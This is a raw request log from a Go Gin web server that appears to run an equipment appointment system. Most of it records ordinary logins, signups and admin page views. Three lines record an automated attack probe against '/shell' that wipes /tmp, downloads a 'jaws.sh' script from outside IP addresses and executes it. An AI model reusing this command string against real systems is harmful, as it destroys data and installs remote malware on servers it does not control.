nohup: ignoring input
[GIN] 2023/03/31 - 20:17:55 | 307 |     367.238µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/03/31 - 22:23:23 | 307 |     112.591µs |   223.104.7.139 | GET      "/favicon.ico"
[GIN] 2023/03/31 - 22:23:23 | 200 |    1.075558ms |   223.104.7.139 | GET      "/home/index"
[GIN] 2023/03/31 - 22:23:25 | 200 |    4.807981ms |   223.104.7.139 | GET      "/admin/all?page=1&pageSize=18"
[GIN] 2023/03/31 - 22:23:25 | 307 |      57.222µs |   223.104.7.139 | GET      "/favicon.ico"
[GIN] 2023/03/31 - 22:23:26 | 200 |     613.324µs |   223.104.7.139 | GET      "/home/index"
[GIN] 2023/03/31 - 22:23:28 | 307 |   19.264813ms |   223.104.7.139 | GET      "/admin/exportRequests"
[GIN] 2023/03/31 - 22:23:29 | 307 |   14.854289ms |   223.104.7.139 | GET      "/admin/exportRequests"
[GIN] 2023/03/31 - 22:23:29 | 200 |     395.235µs |   223.104.7.139 | GET      "/static/files/export_20230331222329.xlsx"
[GIN] 2023/03/31 - 22:27:48 | 307 |      97.814µs |    39.144.81.87 | GET      "/home/index"
[GIN] 2023/03/31 - 22:27:49 | 200 |     175.646µs |    39.144.81.87 | GET      "/login"
[GIN] 2023/03/31 - 22:27:49 | 200 |     488.845µs |    39.144.81.87 | GET      "/static/css/login.css"
[GIN] 2023/03/31 - 22:27:49 | 200 |     849.562µs |    39.144.81.87 | GET      "/static/js/login.js"
[GIN] 2023/03/31 - 22:27:49 | 200 |    5.111301ms |    39.144.81.87 | GET      "/static/img/2.jpg"
[GIN] 2023/03/31 - 22:27:49 | 307 |      104.22µs |    39.144.81.87 | GET      "/favicon.ico"
[GIN] 2023/03/31 - 22:27:49 | 307 |      82.629µs |    39.144.81.87 | GET      "/home/index"
[GIN] 2023/03/31 - 22:27:49 | 200 |     128.165µs |    39.144.81.87 | GET      "/login"
[GIN] 2023/03/31 - 22:27:52 | 200 |     882.173µs |    39.144.81.87 | GET      "/signup"
[GIN] 2023/03/31 - 22:27:52 | 200 |     456.956µs |    39.144.81.87 | GET      "/static/css/signup.css"
[GIN] 2023/03/31 - 22:27:52 | 200 |     458.383µs |    39.144.81.87 | GET      "/static/js/signup.js"
[GIN] 2023/03/31 - 22:27:52 | 307 |      93.055µs |    39.144.81.87 | GET      "/favicon.ico"
[GIN] 2023/03/31 - 22:27:52 | 307 |      99.443µs |    39.144.81.87 | GET      "/home/index"
[GIN] 2023/03/31 - 22:27:52 | 200 |     122.424µs |    39.144.81.87 | GET      "/login"
[GIN] 2023/03/31 - 22:28:20 | 200 |   16.671349ms |    39.144.81.87 | POST     "/signup"
[GIN] 2023/03/31 - 22:28:21 | 200 |     137.609µs |    39.144.81.87 | GET      "/login"
[GIN] 2023/03/31 - 22:28:21 | 307 |     107.998µs |    39.144.81.87 | GET      "/favicon.ico"
[GIN] 2023/03/31 - 22:28:21 | 307 |     113.554µs |    39.144.81.87 | GET      "/home/index"
[GIN] 2023/03/31 - 22:28:21 | 200 |     127.165µs |    39.144.81.87 | GET      "/login"
[GIN] 2023/03/31 - 22:28:33 | 200 |    1.970344ms |    39.144.81.87 | POST     "/login"
[GIN] 2023/03/31 - 22:28:33 | 200 |    1.247576ms |    39.144.81.87 | GET      "/home/index"
[GIN] 2023/03/31 - 22:28:33 | 200 |     509.012µs |    39.144.81.87 | GET      "/static/css/index.css"
[GIN] 2023/03/31 - 22:28:33 | 200 |     564.251µs |    39.144.81.87 | GET      "/static/css/common.css"
[GIN] 2023/03/31 - 22:28:33 | 200 |     449.457µs |    39.144.81.87 | GET      "/static/js/index.js"

2023/03/31 22:28:33 [31;1m/home/huonwe/agointment/handlers.go:108 [35;1mrecord not found
[0m[33m[0.574ms] [34;1m[rows:0][0m SELECT * FROM `requests` WHERE `requests`.`user_id` = 6 AND `requests`.`deleted` IS NULL ORDER BY created_at desc,`requests`.`id` LIMIT 1
[GIN] 2023/03/31 - 22:28:33 | 200 |    2.173915ms |    39.144.81.87 | GET      "/home/me"
[GIN] 2023/03/31 - 22:28:33 | 200 |     783.878µs |    39.144.81.87 | GET      "/static/img/1.png"
[GIN] 2023/03/31 - 22:28:33 | 307 |     109.777µs |    39.144.81.87 | GET      "/favicon.ico"
[GIN] 2023/03/31 - 22:28:33 | 200 |     922.173µs |    39.144.81.87 | GET      "/home/index"
[GIN] 2023/03/31 - 22:28:39 | 200 |    1.071504ms |    39.144.81.87 | GET      "/home/appoint"
[GIN] 2023/03/31 - 22:28:39 | 200 |    2.779722ms |    39.144.81.87 | GET      "/equipment/availiable?name=&page=1&pageSize=15"
[GIN] 2023/03/31 - 22:28:44 | 200 |    1.127078ms |    39.144.81.87 | GET      "/home/status"
[GIN] 2023/03/31 - 22:28:44 | 200 |    3.577527ms |    39.144.81.87 | GET      "/user/myRequest?name=&page=1&pageSize=15"
[GIN] 2023/03/31 - 22:28:44 | 200 |      597.01µs |    39.144.81.87 | GET      "/home/appoint"
[GIN] 2023/03/31 - 22:28:44 | 200 |    1.330686ms |    39.144.81.87 | GET      "/equipment/availiable?name=&page=1&pageSize=15"
[GIN] 2023/03/31 - 22:32:50 | 307 |     154.072µs |   223.104.7.139 | GET      "/favicon.ico"
[GIN] 2023/03/31 - 22:32:50 | 200 |    1.138523ms |   223.104.7.139 | GET      "/home/index"
[GIN] 2023/03/31 - 22:38:55 | 200 |      81.721µs |  113.24.224.201 | GET      "/signup"
[GIN] 2023/03/31 - 22:38:55 | 200 |     264.627µs |  113.24.224.201 | GET      "/static/css/login.css"
[GIN] 2023/03/31 - 22:38:55 | 200 |     227.294µs |  113.24.224.201 | GET      "/static/css/signup.css"
[GIN] 2023/03/31 - 22:38:55 | 200 |     270.182µs |   113.24.224.47 | GET      "/static/js/signup.js"
[GIN] 2023/03/31 - 22:41:04 | 307 |     123.369µs |  113.24.224.233 | GET      "/home/index"
[GIN] 2023/03/31 - 22:41:04 | 200 |     143.776µs |  113.24.224.233 | GET      "/login"
[GIN] 2023/03/31 - 22:41:04 | 200 |     528.864µs |  113.24.224.233 | GET      "/static/css/login.css"
[GIN] 2023/03/31 - 22:41:04 | 200 |     418.588µs |  113.24.224.233 | GET      "/static/js/login.js"
[GIN] 2023/03/31 - 22:54:18 | 304 |     227.477µs |    39.144.81.87 | GET      "/static/css/common.css"
[GIN] 2023/03/31 - 22:54:18 | 304 |     204.236µs |    39.144.81.87 | GET      "/static/js/index.js"

2023/03/31 22:54:18 [31;1m/home/huonwe/agointment/handlers.go:108 [35;1mrecord not found
[0m[33m[0.384ms] [34;1m[rows:0][0m SELECT * FROM `requests` WHERE `requests`.`user_id` = 6 AND `requests`.`deleted` IS NULL ORDER BY created_at desc,`requests`.`id` LIMIT 1
[GIN] 2023/03/31 - 22:54:18 | 200 |    1.260234ms |    39.144.81.87 | GET      "/home/me"
[GIN] 2023/03/31 - 22:54:18 | 307 |      60.739µs |    39.144.81.87 | GET      "/favicon.ico"
[GIN] 2023/03/31 - 22:54:18 | 200 |     649.376µs |    39.144.81.87 | GET      "/home/index"
[GIN] 2023/03/31 - 22:54:19 | 200 |      83.795µs |    39.144.81.87 | GET      "/login"
[GIN] 2023/03/31 - 22:54:20 | 307 |      58.425µs |    39.144.81.87 | GET      "/favicon.ico"
[GIN] 2023/03/31 - 22:54:20 | 200 |     638.043µs |    39.144.81.87 | GET      "/home/index"
[GIN] 2023/03/31 - 22:54:20 | 200 |     135.701µs |    39.144.81.87 | GET      "/signup"
[GIN] 2023/03/31 - 22:54:21 | 307 |     121.127µs |    39.144.81.87 | GET      "/favicon.ico"
[GIN] 2023/03/31 - 22:54:21 | 200 |    1.055682ms |    39.144.81.87 | GET      "/home/index"
[GIN] 2023/03/31 - 22:54:23 | 307 |     111.461µs |    39.144.81.87 | GET      "/favicon.ico"
[GIN] 2023/03/31 - 22:54:23 | 200 |    1.167865ms |    39.144.81.87 | GET      "/home/index"
[GIN] 2023/04/01 - 00:14:20 | 307 |      135.15µs |    111.30.251.1 | GET      "/home/me"
[GIN] 2023/04/01 - 00:14:20 | 200 |     136.982µs |    111.30.251.1 | GET      "/login"
[GIN] 2023/04/01 - 02:39:37 | 400 | 12.000326312s |   65.20.152.183 | GET      "/shell?cd+/tmp;rm+-rf+*;wget+47.87.241.163/jaws.sh;chmod+777+/tmp/jaws.sh;sh+/tmp/jaws.sh"
2023/04/01 02:39:37 http: URL query contains semicolon, which is no longer a supported separator; parts of the query may be stripped when parsed; see golang.org/issue/25192
[GIN] 2023/04/01 - 03:04:34 | 307 |     122.165µs |    45.83.67.214 | GET      "/"
[GIN] 2023/04/01 - 03:04:35 | 307 |     130.277µs |    45.83.67.118 | GET      "/home/index"
[GIN] 2023/04/01 - 03:04:35 | 200 |     138.092µs |    45.83.67.214 | GET      "/login"
[GIN] 2023/04/01 - 03:04:36 | 307 |     110.629µs |    45.83.67.134 | GET      "/favicon.ico"
[GIN] 2023/04/01 - 03:04:37 | 307 |     114.758µs |     45.83.67.85 | GET      "/home/index"
[GIN] 2023/04/01 - 03:04:37 | 200 |     150.962µs |    45.83.67.134 | GET      "/login"
[GIN] 2023/04/01 - 07:37:01 | 400 |  12.00086492s |   158.255.85.50 | GET      "/shell?cd+/tmp;rm+-rf+*;wget+185.254.37.25/jaws.sh;chmod+777+/tmp/jaws.sh;sh+/tmp/jaws.sh"
2023/04/01 07:37:01 http: URL query contains semicolon, which is no longer a supported separator; parts of the query may be stripped when parsed; see golang.org/issue/25192
[GIN] 2023/04/01 - 12:29:51 | 307 |     128.961µs |   223.104.7.139 | GET      "/"
[GIN] 2023/04/01 - 12:29:51 | 307 |     272.477µs |   223.104.7.139 | GET      "/home/index"
[GIN] 2023/04/01 - 12:29:51 | 200 |      64.869µs |   223.104.7.139 | GET      "/login"
[GIN] 2023/04/01 - 12:29:52 | 200 |     431.363µs |   223.104.7.139 | GET      "/static/css/login.css"
[GIN] 2023/04/01 - 12:29:52 | 200 |     441.289µs |   223.104.7.139 | GET      "/static/js/login.js"
[GIN] 2023/04/01 - 12:29:53 | 200 |  958.363776ms |   223.104.7.139 | GET      "/static/img/2.jpg"
[GIN] 2023/04/01 - 12:29:53 | 307 |      47.129µs |   223.104.7.139 | GET      "/favicon.ico"
[GIN] 2023/04/01 - 12:29:53 | 307 |     237.015µs |   223.104.7.139 | GET      "/home/index"
[GIN] 2023/04/01 - 12:29:53 | 200 |      83.739µs |   223.104.7.139 | GET      "/login"
[GIN] 2023/04/01 - 12:30:02 | 200 |    1.869323ms |   223.104.7.139 | POST     "/login"
[GIN] 2023/04/01 - 12:30:03 | 200 |     956.263µs |   223.104.7.139 | GET      "/home/index"
[GIN] 2023/04/01 - 12:30:03 | 200 |    9.431634ms |   223.104.7.139 | POST     "/login"
[GIN] 2023/04/01 - 12:30:03 | 200 |     927.801µs |   223.104.7.139 | GET      "/home/index"
[GIN] 2023/04/01 - 12:30:03 | 200 |     517.788µs |   223.104.7.139 | GET      "/static/css/index.css"
[GIN] 2023/04/01 - 12:30:04 | 200 |     510.955µs |   223.104.7.139 | GET      "/static/css/common.css"
[GIN] 2023/04/01 - 12:30:04 | 200 |     483.826µs |   223.104.7.139 | GET      "/static/js/index.js"
[GIN] 2023/04/01 - 12:30:04 | 200 |    2.249059ms |   223.104.7.139 | GET      "/home/me"
[GIN] 2023/04/01 - 12:30:04 | 200 |     784.932µs |   223.104.7.139 | GET      "/static/img/1.png"
[GIN] 2023/04/01 - 12:30:04 | 200 |     900.264µs |   223.104.7.139 | GET      "/static/img/equipment.ico"
[GIN] 2023/04/01 - 12:30:04 | 200 |     710.323µs |   223.104.7.139 | GET      "/static/img/user.ico"
[GIN] 2023/04/01 - 12:30:04 | 200 |    1.056077ms |   223.104.7.139 | GET      "/static/img/all.ico"
[GIN] 2023/04/01 - 12:30:04 | 200 |     765.174µs |   223.104.7.139 | GET      "/static/img/request.ico"
[GIN] 2023/04/01 - 12:30:04 | 200 |     731.674µs |   223.104.7.139 | GET      "/static/img/back.ico"
[GIN] 2023/04/01 - 12:30:04 | 307 |      46.814µs |   223.104.7.139 | GET      "/favicon.ico"
[GIN] 2023/04/01 - 12:30:04 | 200 |    1.221463ms |   223.104.7.139 | GET      "/home/index"
[GIN] 2023/04/01 - 12:30:09 | 200 |    4.405378ms |   223.104.7.139 | GET      "/admin/all?page=1&pageSize=18"
[GIN] 2023/04/01 - 12:30:09 | 200 |     418.476µs |   223.104.7.139 | GET      "/static/js/admin.js"
[GIN] 2023/04/01 - 12:30:11 | 307 |      30.166µs |   223.104.7.139 | GET      "/favicon.ico"
[GIN] 2023/04/01 - 12:30:11 | 200 |     539.714µs |   223.104.7.139 | GET      "/home/index"
[GIN] 2023/04/01 - 12:30:16 | 200 |    3.860294ms |   223.104.7.139 | GET      "/admin/requestingsOp?op=detail&requestID=4&equipmentID="
[GIN] 2023/04/01 - 12:30:24 | 307 |      81.425µs |   223.104.7.139 | GET      "/favicon.ico"
[GIN] 2023/04/01 - 12:30:24 | 200 |     946.671µs |   223.104.7.139 | GET      "/home/index"
[GIN] 2023/04/01 - 12:30:26 | 200 |    1.596661ms |   223.104.7.139 | GET      "/admin/users"
[GIN] 2023/04/01 - 12:30:26 | 200 |     212.516µs |   223.104.7.139 | GET      "/static/css/admin.css"
[GIN] 2023/04/01 - 12:30:27 | 307 |      25.351µs |   223.104.7.139 | GET      "/favicon.ico"
[GIN] 2023/04/01 - 12:30:27 | 200 |      532.77µs |   223.104.7.139 | GET      "/home/index"
[GIN] 2023/04/01 - 12:30:30 | 200 |    1.615883ms |   223.104.7.139 | POST     "/admin/users/userSearch?dept=&name="
[GIN] 2023/04/01 - 12:30:43 | 307 |      53.147µs |   223.104.7.139 | GET      "/favicon.ico"
[GIN] 2023/04/01 - 12:30:43 | 200 |     989.152µs |   223.104.7.139 | GET      "/home/index"
[GIN] 2023/04/01 - 12:30:45 | 200 |   10.449956ms |   223.104.7.139 | GET      "/admin/all?page=1&pageSize=18"
[GIN] 2023/04/01 - 12:30:46 | 307 |      40.981µs |   223.104.7.139 | GET      "/favicon.ico"
[GIN] 2023/04/01 - 12:30:46 | 200 |     928.116µs |   223.104.7.139 | GET      "/home/index"
[GIN] 2023/04/01 - 12:30:50 | 200 |    1.897954ms |   223.104.7.139 | GET      "/admin/requestingsOp?op=detail&requestID=6&equipmentID="
[GIN] 2023/04/01 - 12:30:52 | 307 |      80.128µs |  180.163.29.234 | GET      "/home/index"
[GIN] 2023/04/01 - 12:30:52 | 200 |      39.926µs |  180.163.29.234 | GET      "/login"
[GIN] 2023/04/01 - 12:30:52 | 200 |     230.127µs |  180.163.29.234 | GET      "/static/js/login.js"
[GIN] 2023/04/01 - 12:34:24 | 307 |      68.795µs |   223.104.7.139 | GET      "/"
[GIN] 2023/04/01 - 12:34:24 | 200 |     604.252µs |   223.104.7.139 | GET      "/home/index"
[GIN] 2023/04/01 - 12:34:24 | 200 |    1.229948ms |   223.104.7.139 | GET      "/home/me"
[GIN] 2023/04/01 - 12:34:24 | 307 |      58.833µs |   223.104.7.139 | GET      "/favicon.ico"
[GIN] 2023/04/01 - 12:34:24 | 200 |     589.122µs |   223.104.7.139 | GET      "/home/index"
[GIN] 2023/04/01 - 12:38:57 | 200 |     1.12245ms |   223.104.7.139 | GET      "/home/status"
[GIN] 2023/04/01 - 12:38:57 | 200 |    5.043534ms |   223.104.7.139 | GET      "/user/myRequest?name=&page=1&pageSize=15"
[GIN] 2023/04/01 - 12:39:00 | 200 |     2.03007ms |   223.104.7.139 | GET      "/home/me"
[GIN] 2023/04/01 - 14:33:53 | 400 | 12.002852612s |    95.86.165.36 | GET      "/shell?cd+/tmp;rm+-rf+*;wget+185.254.37.25/jaws.sh;chmod+777+/tmp/jaws.sh;sh+/tmp/jaws.sh"
2023/04/01 14:33:53 http: URL query contains semicolon, which is no longer a supported separator; parts of the query may be stripped when parsed; see golang.org/issue/25192
[GIN] 2023/04/01 - 17:50:50 | 307 |      97.814µs |   42.80.174.227 | GET      "/home/index"
[GIN] 2023/04/01 - 17:50:50 | 200 |     118.554µs |   42.80.174.227 | GET      "/login"
[GIN] 2023/04/01 - 17:50:51 | 200 |     456.789µs |   42.80.174.227 | GET      "/static/css/login.css"
[GIN] 2023/04/01 - 17:50:51 | 200 |     383.864µs |   42.80.174.227 | GET      "/static/js/login.js"
[GIN] 2023/04/01 - 17:50:51 | 200 |     5.30723ms |   42.80.174.227 | GET      "/static/img/2.jpg"
[GIN] 2023/04/01 - 17:50:51 | 307 |      80.592µs |   42.80.174.227 | GET      "/favicon.ico"
[GIN] 2023/04/01 - 17:50:51 | 307 |     102.757µs |   42.80.174.227 | GET      "/home/index"
[GIN] 2023/04/01 - 17:50:51 | 200 |     125.776µs |   42.80.174.227 | GET      "/login"
[GIN] 2023/04/01 - 17:52:06 | 307 |     161.849µs |   42.80.174.227 | GET      "/favicon.ico"
[GIN] 2023/04/01 - 17:52:06 | 307 |     116.239µs |   42.80.174.227 | GET      "/home/index"
[GIN] 2023/04/01 - 17:52:06 | 200 |     144.091µs |   42.80.174.227 | GET      "/login"
[GIN] 2023/04/01 - 17:52:18 | 307 |      60.573µs |   27.115.124.53 | GET      "/"
[GIN] 2023/04/01 - 17:52:18 | 307 |      62.795µs |   27.115.124.53 | GET      "/home/index"
[GIN] 2023/04/01 - 17:52:18 | 200 |      76.388µs |   27.115.124.53 | GET      "/login"
[GIN] 2023/04/01 - 17:52:18 | 200 |     201.367µs |   27.115.124.53 | GET      "/static/js/login.js"
[GIN] 2023/04/01 - 17:52:18 | 200 |     258.755µs |   27.115.124.53 | GET      "/static/css/login.css"
[GIN] 2023/04/01 - 17:52:18 | 200 |    3.817664ms |   27.115.124.53 | GET      "/static/img/2.jpg"
[GIN] 2023/04/02 - 14:36:48 | 307 |     102.499µs |  117.187.173.69 | GET      "/"
[GIN] 2023/04/02 - 14:38:26 | 307 |     128.314µs |   106.75.101.48 | GET      "/"
[GIN] 2023/04/02 - 14:38:26 | 307 |      110.11µs |   106.75.101.48 | GET      "/favicon.ico"
[GIN] 2023/04/02 - 14:38:26 | 307 |     125.814µs |   106.75.101.48 | GET      "/home/index"
[GIN] 2023/04/02 - 14:38:26 | 200 |      101.24µs |   106.75.101.48 | GET      "/login"
[GIN] 2023/04/02 - 14:38:26 | 307 |      79.722µs |   106.75.101.48 | GET      "/home/index/sitemap.xml"
[GIN] 2023/04/02 - 14:38:26 | 307 |      68.407µs |   106.75.101.48 | GET      "/home/index/robots.txt"
[GIN] 2023/04/02 - 14:38:26 | 307 |      76.241µs |   106.75.101.48 | GET      "/home/index"
[GIN] 2023/04/02 - 14:38:26 | 307 |      76.536µs |   106.75.101.48 | GET      "/home/index"
[GIN] 2023/04/02 - 14:38:26 | 200 |      94.629µs |   106.75.101.48 | GET      "/login"
[GIN] 2023/04/02 - 14:38:26 | 200 |     155.591µs |   106.75.101.48 | GET      "/login"
[GIN] 2023/04/02 - 14:38:26 | 307 |      79.184µs |   106.75.101.48 | GET      "/home/index"
[GIN] 2023/04/02 - 14:38:26 | 307 |       87.61µs |   106.75.101.48 | GET      "/favicon.ico"
[GIN] 2023/04/02 - 14:38:26 | 307 |      92.203µs |   106.75.101.48 | GET      "/home/index"
